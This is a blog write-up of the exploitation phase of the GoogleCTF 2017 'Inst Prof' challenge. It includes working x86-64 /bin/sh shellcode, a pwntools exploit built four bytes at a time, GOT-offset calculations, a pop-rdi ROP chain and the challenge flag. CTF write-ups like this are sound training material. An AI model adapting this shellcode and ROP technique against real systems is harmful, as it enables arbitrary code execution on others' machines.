---
title: "GoogleCTF 2017 - Inst Prof (Part 2)"
description: GoogleCTF 2017 - Inst prof (Part 2)

date: 2017-12-01T18:56:18+02:00
publishdate: 2017-12-01T21:45:18+02:00

summary: "Once we have understood how the binary works (this was explained in part 1), we can move forward to 
understand how can we exploit this."
cardthumbimage: "/assets/GoogleCTF2017/title.png"

author:
  email: tzaoh1@gmail.com
  github: https://github.com/tzaoh
  image:
  - /images/avatar-64x64.png
  name:
  - Tzaoh

cardbackground: 'orange'
cardtitlecolor: 'white'

post_categories:
- CTFs

tags:
- CTF
- GoogleCTF
- 2017

---

![inst_prof Description](/assets/GoogleCTF2017/Inst Prof/1-inst_prof_description.png)

#### Introduction

This post is the second part of the solucion of **Inst Prof**, an initial challenge of the GoogleCTF 2017.  
Basically, the analysis phase was already donein [part1](../inst_prof_p1), so, in this post, we are going to 
focus with the exploitation phase.

---

#### Flash reminder

Just to remember what we explained in [part 1](../inst_prof_p1), here is an easy list with the normal flow of 
the process. Here is a [patched version of the binary](/assets/GoogleCTF2017/Inst Prof/inst_prof.patched) as 
we explained in the part 1.

1. It allocates a memory page of `0x1000` bytes with read and write privileges (remember the `PROT_READ | PROT_WRITE` stuff).

2. It copies the following instructions inside of this newly-allocated page:  
{{< highlight r2 >}}
            0x7fd4a1197000      b900100000     ecx = 0x1000            
        ┌─> 0x7fd4a1197005      90                                     
        |   0x7fd4a1197006      90                                     
        |   0x7fd4a1197007      90                                     
        |   0x7fd4a1197008      90                                     
        |   0x7fd4a1197009      83e901         ecx -= 1                
        └─< 0x7fd4a119700c      75f7           if (var) goto 0x7fd4a1197005
            0x7fd4a119700e      c3                                     
{{< /highlight >}}

3. Later on, it reads an input from `stdin` and uses the first `4 bytes` to overwrite the `nop` opcodes we 
saw 
in the previous point (those `90`). For example, if we input the character `\xc3` (which is the opcode for `ret` instruction) four times, we will get this:  
{{< highlight r2 >}}
$ r2 -Ad -R "stdin=\"`echo -ne "\xc3\xc3\xc3\xc3"`\"" -c 'dcu `/r sym.read_inst~[1]`; dso; pd 8 @ r:rbx;' inst_prof
            0x7f6b63902000      b900100000     ecx = 0x1000            
        ┌─> 0x7f6b63902005      c3                                     
        |   0x7f6b63902006      c3                                     
        |   0x7f6b63902007      c3                                     
        |   0x7f6b63902008      c3                                     
        |   0x7f6b63902009      83e901         ecx -= 1                
        └─< 0x7f6b6390200c      75f7           if (var) goto 0x7f6b63902005 ; likely
            0x7f6b6390200e      c3                                     
{{< /highlight >}}

4. It uses a function called `sym.make_page_executable` to update the permissions of the above memory region where the code resides. These permissions change from **read** and **write** (-rw-) to **read** and **execute** (-r-x).

5. After these permissions have been updated, the process will execute our inserted bytes or instructions.

6. It deallocates de memory region.

7. And it starts again.

---

#### Objective

So, our goal is to allocate an entire [shellcode](https://en.wikipedia.org/wiki/Shellcode) somewhere in 
memory and redirect the execution flow to it. We have some little problems regarding this:

1. We have to do it using instructions formed with 4 bytes as max (remember the process will only read 4 bytes each time you send something).

2. Furthermore, If the instruction provided is a 4-byte one, it will be executed `4096` (or `0x1000`) times because it will be inserted inside a loop.  
If it has less, we could avoid this behavior adding an extra byte: `c3` which is the opcode for the return statement. If we use it we will break the mentioned loop.

3. We need an **address** to write the bytes to and the section this address belongs to must have execution permissions.

4. We will need to save some stuff on the registers, i.e. the address we are going to copy our shellcode to. We will need to identify which registers are **not used** from our first input to the next one.

---

#### How to

To code an exploit, I decided to use python along with a fully recommended library called [pwntools](https://github.com/Gallopsled/pwntools).  
The main reasons to use this library are:

1. It allows us to start a local process or to connect to a remote one with a single line and in a simple way. Just like this:  
```python
# Execute the local binary
p = process("./inst_prof")
# Connect to the remote process
p = remote("inst-prof.ctfcompetition.com", 1337)
```

2. Instead of sending the opcodes directly we can use the `asm()` method. Have in mind we should tell 
`pwntools` which architecture and operating system we are expecting. We do this through the `context()` 
method. An example of this would be:  
```python
context(arch='amd64', os='linux')
p.send(asm('mov r13, [rsp]'))
```

All right, so first we need a shellcode. I am using [my own](/assets/GoogleCTF2017/Inst Prof/shellcode.asm), but 
you can search for [another](https://www.google.com/search?q=shellcode+bin+sh+x64+linux) if you want (have in mind that not all of them works).
```python
shellcode = (
    "\xb0\x3b\x99\x48\xbb\x2f"
    "\x62\x69\x6e\x2f\x2f\x73"
    "\x68\x52\x53\x54\x5f\x52"
    "\x57\x54\x5e\x0f\x05"
)
```

We can copy the shellcode byte by byte using the following asm instruction:
```asm
mov byte [r15], {byte}
```

Lets check how many bytes that instruction requires. We are going to try it with the first byte of the above shellcode:
```bash
$ rasm2 -a x86 -c 64 'mov byte [r15], 0xb0'
41c607b0
```
> `-a x86` tells `rasm2` to compile the instruction for the architecture `x86`.  
`-c 64` indicates we want it for a 64 bits cpu.

Four bytes. That means that we cannot apply a `ret` instruction.
{{< highlight r2 "hl_lines=3" >}}
[0x7f556238a000 230 /root/inst_prof]> pd $r @ map.unk2._rw_
            0x7f556238a000      b900100000             ecx = 0x1000
        ┌─> 0x7f556238a005      41c607b0               byte [r15] = 0xb0
        |   0x7f556238a009      83e901                 ecx -= 1
        └─< 0x7f556238a00c      75f7                   if (var) goto 0x7f556238a005
            0x7f556238a00e      c3                     
{{< /highlight >}}

So the loop will write `4096` times `0xb0` on the same address. Fair enough, it is a waste of cycles but it will 
work. This way we can copy the 23 bytes of the shellcode.

We still need to know a couple things more:

**1.** an initial **address** where to start writing our shellcode to. Ideally, we would want to use a memory area 
with `write` and `execution` permissions, but there is none. So we will use a section that has at least `write` 
permissions like the [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) section and we will deal with the 
execution permission later.

{{< highlight r2 "hl_lines=3" >}}
[0x5569ad584b18]> dm~rwx
[0x5569ad584b18]> dm~rw-
usr     4K 0x00005569ad786000 - 0x00005569ad787000 s -rw- /root/inst_prof /root/inst_prof ; obj._GLOBAL_OFFSET_TABLE_
usr     8K 0x00007f0efa979000 - 0x00007f0efa97b000 s -rw- /lib/x86_64-linux-gnu/libc-2.24.so /lib/x86_64-linux-gnu/libc-2.24.so
usr    16K 0x00007f0efa97b000 - 0x00007f0efa97f000 s -rw- unk0 unk0
usr     8K 0x00007f0efab80000 - 0x00007f0efab82000 s -rw- unk1 unk1
usr    12K 0x00007f0efab9f000 - 0x00007f0efaba2000 s -rw- unk3 unk3
usr     4K 0x00007f0efaba3000 - 0x00007f0efaba4000 s -rw- /lib/x86_64-linux-gnu/ld-2.24.so /lib/x86_64-linux-gnu/ld-2.24.so
usr     4K 0x00007f0efaba4000 - 0x00007f0efaba5000 s -rw- unk4 unk4 ; map.unk0._rw_
usr   132K 0x00007ffd4fb3c000 - 0x00007ffd4fb5d000 s -rw- [stack] [stack] ; map._stack_._rw_
{{< /highlight >}}

> `dm` list the memory maps of the current process.  
`~rwx` or `~rw-` is used to filter between all the mappings of the process.

In this case `0x00005569ad786000` is the address we are looking for **BUT** remember `PIC` flag is enabled so our executable will be loaded at a random address each time it will be launched.

This is a problem that can be solved thinking that even being loaded at a different place, **THE DISTANCE** between 
some specific points will always be the same. We will take the value the `rsp` register is pointing to (which is 
going to be a return address, the address right after the `call rbx` instruction).

{{< highlight r2 "hl_lines=4" >}}
[0x558cfc7d3b16 230 /root/inst_prof]> pd $r @ hit0_0
|           ;-- hit0_0:
│           0x558cfc7d3b16 b    ffd3           rbx ()
│           0x558cfc7d3b18      0f31                 
│           0x558cfc7d3b1a      bf01000000     edi = 1
│           0x558cfc7d3b1f      48c1e220       rdx <<<= 0x20
{{< /highlight >}}

and get the difference between that address and the address of the GOT.

```r2
[0x7f8b1803b000]> ? section..got.plt - [rsp]
2102504 0x2014e8 010012350 2M 20000:04e8 2102504 "\xe8\x14 " 001000000001010011101000 2102504.0 2102504.000000f 2102504.000000
```

This way we will not need to worry about where is the `GOT` located: it will always be at `[rsp] + 0x2014e8`. We 
will need to generate that value on runtime and save it into a register. Once it will be generated, we will use it 
to store our shellcode there.

**2.** and we will need a **register** to store that generated address.

But we can not use one the register we want because is possible it is going that the process is using it to do 
other stuff and we dont want to crash the program for being careless.  
To know which registers we can use, we will:

1. stop the execution just before the first 4 input bytes

2. alter some registers (I altered `r13`, `r14` and `r15` but you can try the ones you want, just remember you will maybe need the values of these registers to generate `0x2014e8`),

3. and read another 4 bytes to check if after one loop any of our chosen registers have been changed.

{{< highlight r2 "hl_lines=12 20" >}}
$ r2 -Ad -R "stdin=\"`python -c 'print(\"\xc3\" * 8)'`\"" -c 'dcu main; db `/a call rbx~[0]`; dc; ds 2; dr r13=0x1111; dr r14=0x2222; dr r15=0x3333; Vpp' inst_prof
- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7fffb7fbd398  182b c6a0 6755 0000 a02c f36e 167f 0000  .+..gU...,.n....
0x7fffb7fbd3a8  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffb7fbd3b8  c928 c6a0 6755 0000 d0d3 fbb7 ff7f 0000  .(..gU..........
0x7fffb7fbd3c8  c728 c6a0 6755 0000 602b c6a0 6755 0000  .(..gU..`+..gU..
 rax 0x00000000           rbx 0x7f166f142000       rcx 0x00001000
 rdx 0x4e0200000000        r8 0xffffffffffffffff    r9 0x00000000
 r10 0x00000487           r11 0x00000202           r12 0x4e029a1c56e7
 r13 0x00001111           r14 0x00002222           r15 0x00003333
 rsi 0x00001000           rdi 0x7f166f142000       rsp 0x7fffb7fbd398
 rbp 0x7fffb7fbd3c0       rip 0x7f166f142005       rflags 1PI
orax 0xffffffffffffffff
            ;-- rbx:
            ;-- rdi:
            0x7f166f142000      b900100000     ecx = 0x1000            ; rsi
        ┌─> ;-- rip:
        ┌─> 0x7f166f142005      c3 
        |   0x7f166f142006      c3 
        |   0x7f166f142007      c3 
        |   0x7f166f142008      c3 
        |   0x7f166f142009      83e901         ecx -= 1
        └─< 0x7f166f14200c      75f7           if (var) goto 0x7f166f142005 ;[1] ; rip; likely
            0x7f166f14200e      c3 
{{< /highlight >}}

> `r2 -Ad ... inst_prof`: Analyze and open for debugging the specified binary.  
``-R "stdin=\"`python -c 'print(\"\xc3\" * 8)'`\""``: This is just to generate 8 `\xc3` bytes for the standard 
input.  
``dcu main``: Execute until `main` is reached.  
``db `/a call rbx~[0]` ``: Once `main` is reached, we can search for the address of the `call rbx` instruction and 
place a breakpoint there
``dc; 2ds;``: We continue the execution with `dc` until we reach the breakpoint we've just set and we move 2 
instructions from there.
``dr r13=0x1111; dr r14=0x2222; dr r15=0x3333;``: change the values of 3 registers.  
`Vpp`: To activate visual mode.

In short, with the latest command we are sending two inputs of `4 bytes` each. These 4 bytes groups are `\xc3\xc3\xc3\xc3`, which means 4 `ret` instructions.

With the first input, we stop at the first `ret` opcode and once there, we change the value of some registers and resume the flow execution.

If the values of the registers we modified are the same in the next iteration of `do_test`, it will mean those registers are reliable to be used in our exploit. 

After activating the visual mode with `Vpp`, press `:` and type `dc;ds` now. We are in the next iteration of the 
loop with the following 4 bytes. As you see, `r13` `r14` and `r15` has still the same values, so we can assume we 
can use those 3 registers in our exploit.
{{< highlight r2 "hl_lines=10" >}}
[0x7fa647873000 230 /root/inst_prof]> ?0;f tmp;s.. @ rbx 
- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7ffed3ffc748  18eb 4887 f455 0000 a03c 6647 a67f 0000  ..H..U...<fG....
0x7ffed3ffc758  5d91 fc8c 0800 0000 0000 0000 0000 0000  ]...............
0x7ffed3ffc768  c9e8 4887 f455 0000 80c7 ffd3 fe7f 0000  ..H..U..........
0x7ffed3ffc778  c7e8 4887 f455 0000 60eb 4887 f455 0000  ..H..U..`.H..U..
 rax 0x00000000           rbx 0x7fa647873000       rcx 0x7fa64739b4c7     
 rdx 0xf26700000000        r8 0xffffffffffffffff    r9 0x00000000         
 r10 0x00000022           r11 0x00000246           r12 0xf267c0c00651     
 r13 0x00001111           r14 0x00002222           r15 0x00003333         
 rsi 0x00001000           rdi 0x7fa647873000       rsp 0x7ffed3ffc748     
 rbp 0x7ffed3ffc770       rip 0x7fa647873000       rflags 1I              
orax 0xffffffffffffffff               
{{< /highlight >}}

---

#### Ufff.. alright! what's next?

Now it is time to find out how we generate the magic value `0x2014e8`. To do that, lets see which values we have at 
our disposal checking the registers at the first iteration of `do_test`.  
Once we get it we will add that value to `[rsp]` (not rsp but the value it points too) and save it in one of our 
three registers (`r13`, `r14` or `r15`) to use it later.

{{< highlight r2 "hl_lines=5" >}}
$ r2 -Ad -R "stdin=\"`python -c 'print(\"\xc3\" * 8)'`\"" -c 'dcu main; dcu `/a call rbx~[0]`; ds; dr=' inst_prof
 rax 0x00000000           rbx 0x7f7d18d63000       rcx 0x7f7d1888b4c7
 rdx 0x10b2e00000000       r8 0xffffffffffffffff    r9 0x00000000
 r10 0x00000487           r11 0x00000206           r12 0x10b2efa655245
 r13 0x7ffe8c2b98a0       r14 0x00000000           r15 0x00000000
 rsi 0x00001000           rdi 0x7f7d18d63000       rsp 0x7ffe8c2b9790
 rbp 0x7ffe8c2b97b0       rip 0x561095b73b16       rflags 1I
orax 0xffffffffffffffff  
{{< /highlight >}}

I started like this:
```python
ret = asm('ret')                            # "\xc3"

# We store the content rsp is pointing to in r13.
p.send(asm('mov r13, [rsp]'))               # "\x4c\x8b\x2c\x24" 4 bytes! so we can not append a ret instrucction. 
# This is going to be executed 0x1000 times which is not going to suppose a problem.

# We need to get 0x2014e8 and add it to r13
p.send(asm('add r15, 0x20'))                # "\x49\x83\xc7\x20" -> r15 = 0x20 * 0x1000 -> 0x20000
# Again, remember that the instruction will be executed 0x1000 times if we do not add a "ret" opcode.
# This way we are going to store 0x20 * 0x1000 (0x20000) in r15.

# We send 0x10 times the next instruction.
# Each of this sends will not be executed 0x1000 times because we are adding a `ret` opcode.
inst = asm('add r14, r15') + ret
for i in range(0x10):
    p.send(inst)       # "\x4d\x01\xfe" + "\x3c"; r14 = 0x200000
# It has a ret instrucction attached so it will only going to get executed once each sending.
# r14 has a initial value of 0x0 so adding to 0x0 0x10 times 0x20000 will result in 0x200000!

# r10 is initially 0x487. If we add it 0x9D times to r14 we get ...
inst = asm('add r14, r10') + ret            # "\x4d\x01\xd6" + "\x3c"
for i in range(0x9D):
    p.send(inst)                            # r14 = 0x2014da ! We are pretty close

# We only need an extra 0xE so ...
inst = asm('inc r14') + ret                 # "\x49\xff\xc6" + "\xc3"
for i in range(0xE):
    p.send(inst)                            # r14 = 0x2014e8 !!

# Ta-dahhh! Now we add r13 (which have [rsp])  and ... 
p.send(asm('add r13, r14') + ret)           # "\x4d\x01\xf5" + "\xc3"; 
# r13 = r13 + 0x2014e8 = GOT TABLE !! 
```

Obviously, there is some data at the beginning of the GOT section. We should avoid overwritting it. That's the 
reason of the following lines.
```python
# We make a copy of the initial address of the GOT in r14
p.send(asm('mov r14, r13') + ret)           # "\x4d\x89\xee" + "\xc3";

# We add 0x80 to r14 to point aheader, not the values we do not want to overwrite.
inst = asm('inc r14') + ret                 # "\x49\xff\xc6" + "\xc3"; 
for i in range(0x80):
    p.send(inst)

# Copy of the address + 0x80 to r15.
# We will need this copy to use it as an iterator to copy each byte of the shellcode into memory.
p.send(asm('mov r15, r14') + ret)           # "\x4d\x89\xf7" + "\xc3";

```
Dont get lost. Briefly, when the execution of this script reach this point, the value of `r13`, `r14` and `r15` 
is going to be:

1. `r13` = Beginning of GOT

2. `r14` = GOT + 0x80 = Start address of our shellcode

3. `r15` = GOT + 0x80 = Start address of our shellcode

> mmmh repeat me again, why `r14` and `r15` has the same value?

It is just because we will increment `r15` one by one and use it to write each byte of the shellcode but we 
will still need to know its initial value to say: "Hey you! start executing instructions at this point please".

At this point we want to write the entire shellcode at a register (`r14` or `r15`) incrementing it by one each time one of the bytes of the shellcode is stored.
```python
def writeByteString(str):
    mov_r15 = "\x41\xc6\x07"                # mov byte ptr [r15], {byte}
    inc_r15 = asm('inc r15') + ret          # "\x49\xff\xc7" + "\xc3"
    
    for byte in str:
        p.send(mov_r15 + byte)              
        p.send(inc_r15)                     # inc r15    
```

When we execute that function with the shellcode as argument the registers will be as follows:

1. `r13` = Beginning of GOT

2. `r14` = GOT + 0x80 = Start address of our shellcode

3. `r15` = GOT + 0x80 + 0x23 = End address of our shellcode

Lets check all this code and show the memory of the process with r2 to ensure that our shellcode is there. 
[solve1.py](/assets/GoogleCTF2017/Inst Prof/solve1.py).
```bash
$ ./solve1.py
[+] Starting local process './inst_prof': pid 17632
initializing prof...ready
```

Once the script is initiated we open a new terminal, attach radare2 to the process and check if our shellcode has 
been inserted correctly.
{{< highlight r2 "hl_lines=11 12" >}}
$ r2 -d 21370
[0x7f5ac270fa61]> pxq @ section..got.plt 
0x55aaeef73000  0x0000000000201e08  0x00007f5ac2c06100   .. ......a..Z...
0x55aaeef73010  0x00007f5ac29f5db0  0x00007f5ac270faf0   .]..Z.....p.Z...
0x55aaeef73020  0x00007f5ac2719050  0x000055aaeed717d6   P.q.Z........U..
0x55aaeef73030  0x00007f5ac270fa50  0x00007f5ac2648e80   P.p.Z.....d.Z...
0x55aaeef73040  0x000055aaeed71806  0x00007f5ac2719140   .....U..@.q.Z...
0x55aaeef73050  0x00007f5ac2719170  0x000055aaeed71836   p.q.Z...6....U..
0x55aaeef73060  0x000055aaeed71846  0x000055aaeed71856   F....U..V....U..
0x55aaeef73070  0x0000000000000000  0x000055aaeef73078   ........x0...U..
0x55aaeef73080  0x69622fbb48993bb0  0x54535268732f2f6e   .;.H./bin//shRST
0x55aaeef73090  0x00050f5e5457525f  0x0000000000000000   _RWT^...........
0x55aaeef730a0  0x0000000000000000  0x0000000000000000   ................
0x55aaeef730b0  0x0000000000000000  0x0000000000000000   ................
0x55aaeef730c0  0x0000000000000000  0x0000000000000000   ................
0x55aaeef730d0  0x0000000000000000  0x0000000000000000   ................
0x55aaeef730e0  0x0000000000000000  0x0000000000000000   ................
0x55aaeef730f0  0x0000000000000000  0x0000000000000000   ................
{{< /highlight >}}

Nice! the shellcode is inserted.  
Now we only need to make that memory zone executable and redirect the flow to `r14`, where our shellcode lives on.

---

#### Make a page executable? Is that even possible?
Well, normally is a bit more complicated than here. Thankfully, we have a function called `sym.make_page_executable()` which receives a 0x1000-aligned address.

{{< highlight r2 "hl_lines=2" >}}
[0x7f8137df2a61]> aaa;afl~make
0x55c877154a20    1 20           sym.make_page_executable
{{< /highlight >}}

Again, we need to calculate this address at runtime since it will change on every execution.  
We will calculate the difference between `sym.make_page_executable()` and `[rsp]`, just like we did 
previously with the `GOT`.

Once we have calculated this second the address, we will insert it on a specific position of the stack to redirect 
the flow. Remember that `sym.make_page_executable()` needs a 0x1000-aligned address. We will use the address of the 
`GOT` which is always aligned to that number. Look:

{{< highlight r2 "hl_lines=5" >}}
[0x7f8137df2a61]> dr~r1
r10 = 0x00000022
r11 = 0x00000246
r12 = 0x7f81382e6009
r13 = 0x55c877356000
r14 = 0x55c877356080
r15 = 0x55c877356097
{{< /highlight >}}


We want to send the address stored in `r13`. As we saw in the [first part](../inst_prof_p1) the calling 
convention for a 64 bit arquitecture states that:

> The first six arguments [of a function] are passed in registers **RDI**, **RSI**, **RDX**, **RCX**, **R8**, and 
**R9**.

> the return value is stored in **RAX** and **RDX**.

Then we need to move `r13` to `RDI`. Something like:
```python
p.send(asm("mov rdi, r13"))
```

The instruction only has a 3-bytes opcode

```bash
$ rasm2 -a x86 -c 64 'mov rdi, r13'
4c89ef
```

The problem is that we need an iteration in the loop to do that, **BUT** `RDI` will be overwritten by the time 
we get to the second iteration. What could we do then?

The answer is [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming).  
Basically we are going to re-use existent instructions of the process to alter the `RDI` value, jump from there 
to `sym.make_page_executable()` and from there to our shellcode. The instruction - or how they are called: ROP 
Gadget - we are going to re-use is:

```asm
pop rdi
ret
```

We have to find out the address of that gadget, write its address in the stack overwritting the current return 
address of the current stack frame and right after it, push the value we want to store. 

How do we find the address of the ROP gadget? Luckily, r2 has a very handful command to accomplish this task.

{{< highlight r2 >}}
$ r2 -Ad -c 's main; "/R pop rdi;ret"' -d inst_prof
0x55f78b7bdbc3                 5f  pop rdi
0x55f78b7bdbc4                 c3  ret
{{< /highlight >}}

> `-Ad`: we already know that `A` stands for `Analyze` and `d` is to open for `debugging`.  
`-c` just passes the commands directly to r2. We want to positioned ourselves in the `main` function (`s 
main`) and search for our desired gadget `"/R pop rdi;ret"`.

Ok! so there we will have to write the following data in the stack:

{{< highlight sh "cssclass=highlight compact text-center" >}}
------------------------------------------------------------------------
address of the ROP gadget
------------------------------------------------------------------------
value we want to send to make_page_executable
which is the address of the GOT   
------------------------------------------------------------------------
address of make_page_executable
------------------------------------------------------------------------
{{< /highlight >}}

Wee can write these values wherever we want to into the stack, just have in mind they need to survive to several calls 
of `sym.do_test()`. I decided to use the following addresses:

{{< highlight sh "cssclass=highlight compact" >}}
----------------------------------------------------------------------
 rsp + 24  │              address of the ROP gadget             │ 
----------------------------------------------------------------------
 rsp + 32  │    value we want to send to make_page_executable   │ r13
           │         which is the address of the GOT            │ 
----------------------------------------------------------------------
 rsp + 40  │           address of make_page_executable          │ 
----------------------------------------------------------------------
{{< /highlight >}}

Once again, remember that we need to calculate the addresses on-runtime. Not the three of them, but two because 
we already have the address of the GOT in `r13`. `r14` is not shown in the previous schema but it has the address where our shellcode starts and will be used in 
a latter phase.

We only have `r15` free, so we are going to save `r13` in `rsp + 32` at first place to be able to use that register too.

{{< highlight python "hl_lines=7 8 9" >}}
# 1) rsp + 32 -> GOT table address (r13)
p.send(asm('mov r15, rsp') + ret)        # "\x49\x89\xe7" + ret

inst = asm('inc r15') + ret              # "\x49\xff\xc7" + ret
for i in range(32):
    p.send(inst)
p.send(asm('mov [r15], r13') + ret)      # \x4d\x89\x2f + ret
# :> pxq 8 @ rsp+32
# 0x7ffde1355c48  0x000055664a259000                       ..%JfU..
{{< /highlight >}}

All right, lets go with the address of `sym.make_page_executable()` at `rsp + 40`

{{< highlight r2 >}}
$ r2 -Ad -R "stdin=\"`python -c 'print(\"\xc3\" * 8)'`\"" -c 'dcu main; db `/a call rbx~[0]`; dc; ds 2' inst_prof
[0x7fbf976e6005]> ? sym.make_page_executable - [rsp]
-248 0xffffffffffffff08 01777777777777777777410 17179869184.0G fffff000:0f08 -248 
"\b\xff\xff\xff\xff\xff\xff\xff" 1111111111111111111111111111111111111111111111111111111100001000 -248.0 
-248.000000f -248.000000
{{< /highlight >}}

All right, so it seems that `sym.make_page_executable() = [rsp] - 248`

{{< highlight python "hl_lines=10 11 12" >}}
# 2) rsp + 40 -> addr make executable
p.send(asm('mov r13, [rsp]'))               # "\x4c\x8b\x2c\x24"
inst = asm('dec r13') + ret
for i in range(248):
    p.send(inst)                            # "\x49\xff\xcd" + ret
p.send(asm('mov r15, rsp') + ret)           # "\x49\x89\xe7" + ret
inst = asm('inc r15') + ret
for i in range(40):
    p.send(inst)                            # "\x49\xff\xc7" + ret
p.send(asm('mov [r15], r13') + ret)         # "\x4d\x89\x2f" + ret
# :> pxq 8 @ rsp+24
# 0x7ffde1355c40  0x000055664a057a20                        z.JfU..
{{< /highlight >}}

`rsp + 32` .. `rsp + 40` .. and now we go for `rsp + 24`. We have to write there the address of the ROP 
gadget. Lets calculate the distance.

{{< highlight r2 "hl_lines=7" >}}
$ r2 -Ad -R "stdin=\"`python -c 'print(\"\xc3\" * 8)'`\"" -c 'dcu main; db `/a call rbx~[0]`;' inst_prof
[0x5590dcff1860]> dc
initializing prof...ready
hit breakpoint at: 5590dcff1b16
[0x5590dcff1b16]> ds 2
[0x7fd31ab7f005]> ? 0x5590dcff1bc3 - [rsp]
171 0xab 0253 171 0000:00ab 171 "\xab" 10101011 171.0 171.000000f 171.000000
{{< /highlight >}}

The ROP gadget is `0xab` bytes away from `[rsp]`, or the return address.

{{< highlight python "hl_lines=10" >}}
# 3) rsp + 24 -> ROP pop rdi + ret
p.send(asm('mov r13, [rsp]'))              # "\x4c\x8b\x2c\x24"
inst = asm('inc r13') + ret
for i in range(0xab):
    p.send(inst)                           # "\x49\xff\xc5" + ret
p.send(asm('mov r15, rsp') + ret)          # "\x49\x89\xe7" + ret
inst = asm('inc r15') + ret
for i in range(24):
    p.send(inst)                           # "\x49\xff\xc7" + ret
p.send(asm('mov [r15], r13') + ret)        # "\x4d\x89\x2f" + ret
# :> pxq 8 @ rsp+24
# 0x7ffe34edf120  0x0000562f517c0bc3                       ..|Q/V..
{{< /highlight >}}

At this point we only have to do a few more things.  
First, we set the `return address` to the address of our `ROP gadget`, just to redirect the flow of the program 
after end the current function. Something like `rsp = rsp + 24`.

Lets calculate `r15 = rsp + 24`.
{{< highlight python >}}
p.send(asm('mov r15, rsp') + ret)        # "\x49\x89\xe7" + ret
inst = asm('inc r15') + ret
for i in range(24):
    p.send(inst)                         # "\x49\xff\xc7" + ret
{{< /highlight >}}

And once it is calculated, we use it to update the value of `rsp`:
{{< highlight python >}}
p.send(asm('mov rsp, r15') + ret)        # "\x4c\x89\xfc" + ret
{{< /highlight >}}

And finally we only need to redirect the flow to our shellcode!
{{< highlight python >}}
p.send(asm('mov [rsp], r14'))            # "\x4c\x89\x34\x24"
p.interactive()
{{< /highlight >}}

Complete exploit: [solve2.py](/assets/GoogleCTF2017/Inst Prof/solve2.py).

Answer: CTF{0v3r_4ND_0v3r_4ND_0v3r_4ND_0v3r}

---

#### Video

<a href="https://asciinema.org/a/R71WGFkZWEyonqfK5DLf0l5UN?autoplay=1">
  <img src="https://asciinema.org/a/R71WGFkZWEyonqfK5DLf0l5UN.png"/>
</a>

---

#### References and tools used

 * [radare2](https://github.com/radare/radare2) - To analyze the binary.
 * [asciinema](https://asciinema.org) - To record the session.
 * [BinaryStud.io](https://binarystud.io/googlectf-2017-inst-prof-152-final-value.html) - Another solution using r2!
 * [python](https://www.python.org/) and [pwntools](https://github.com/Gallopsled/pwntools) - To code the 
exploitation phase.
 * [shellcode](https://en.wikipedia.org/wiki/Shellcode) - Shellcode explanation.
 * [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) - Global Offset Table explanation.
 * [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming) - Return Oriented Programming.
